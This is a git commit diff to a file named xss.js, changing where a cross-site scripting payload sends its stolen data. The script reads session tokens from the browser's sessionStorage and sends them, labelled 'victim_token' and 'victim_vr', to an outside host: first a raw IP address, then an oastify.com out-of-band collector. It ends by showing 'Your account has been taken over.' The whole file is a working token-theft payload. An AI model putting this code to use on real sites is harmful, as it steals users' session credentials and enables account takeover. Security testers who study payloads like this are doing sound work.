9c69e083bacf47d4c2f70d00417255812e35f316
zinc000 <140118579+zinc000@users.noreply.github.com>
2025-08-04 13:29:12 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,7 +1,7 @@
 var token = sessionStorage.getItem("token"); 
 var vr = sessionStorage.getItem("vr");
 
-fetch(`https://194.135.81.248/?victim_token=${token}`);
-fetch(`https://194.135.81.248/?victim_vr=${vr}`);
+fetch(`https://oumryxo2agfehjeckuhtil8d64cv0loa.oastify.com/?victim_token=${token}`);
+fetch(`https://oumryxo2agfehjeckuhtil8d64cv0loa.oastify.com/?victim_vr=${vr}`);
 
 alert(`Your account has been taken over.`);
